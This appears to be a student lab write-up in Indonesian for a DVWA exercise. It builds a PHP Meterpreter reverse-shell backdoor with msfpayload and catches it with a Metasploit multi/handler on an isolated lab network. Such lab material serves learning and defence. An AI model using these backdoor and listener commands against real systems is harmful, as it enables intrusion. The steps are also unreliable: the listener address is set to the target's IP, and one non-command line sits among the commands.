# DVWA | Lesson 8
## Konfigurasi

###{ Upload PHP Backdoor Payload }

pada lesson 8, kami menggunakan metasploid dan backtrack.

- pertama-tama agar backtrack dan metasploit mendapat IP, buka vm -> klik kanan -> setting -> network -> pilih bridge adapter

![alt text](./backtrack.png)
![alt text](./metasploit.png)

Alamat target DVWA (metasploitable) 
`http://10.151.34.170`

Alamat penyerang (backtrack)
`http://10.151.34.160`


## Skenario
![alt text](./1.png)
- start metasploit dan backtrack yang sudah dikonfigurasi

- log in backtrack dan metasploitable
- membuat direktori backdoor, membuat msfpayload

    `mkdir -p /root/backdoor`
    `cd /root/backdoor`
    `msfpayload php/meterpreter/reverse_tcp LHOST=10.151.34.170 ``LPORT=4444 R > PHONE_HOME.php`
    `ls -l PHONE_HOME.php`

![alt text](./2.png)
![alt text](./3.png)
 - menghapus tanda pagar yang ada di phone_home.php
 - keluar menggunakan command :
    `:q!' -> enter
![alt text](./4.png)

- menjalankan command : 
- LHOST disesuaikan dengan IP metasploit

    `use exploit/multi/handler`
    `set PAYLOAD php/meterpreter/reverse_tcp`
   ` set LHOST 10.151.34.170`
    `set LPORT 4444`
    `exploit`
    `Continue to Next Section`

![alt text](./6.png)
![alt text](./7.png)
![alt text](./8.png)
![alt text](./9.png)
![alt text](./10.png)
![alt text](./11.png)
![alt text](./12.png)
![alt text](./13.png)
![alt text](./14.png)
![alt text](./15.png)




## Hasil
kita bisa mengcrack password 
![alt text](./sukses.png)